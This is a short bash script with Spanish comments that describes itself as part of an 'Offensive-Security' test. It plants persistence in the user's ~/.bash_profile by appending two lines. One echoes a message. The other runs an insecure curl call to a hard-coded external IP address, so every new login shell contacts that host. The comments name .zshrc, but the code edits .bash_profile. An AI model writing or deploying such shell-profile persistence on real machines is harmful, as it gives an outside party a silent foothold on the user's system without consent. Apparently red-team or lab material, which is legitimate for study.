#!/bin/bash
#agregando cositas al .zshrc
MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
CURL="curl -k https://104.248.64.180:8000/bash-profile"

# Verificar si el mensaje ya existe en el .zshrc
if ! grep -Fxq "$MESSAGE" ~/.bash_profile; then
    echo "$MESSAGE" >> ~/.bash_profile
fi
# Verificar si el curl ya existe en el -zshrc
if ! grep -Fxq "$CURL" ~/.bash_profile; then
    echo "$CURL" >> ~/.bash_profile
fi
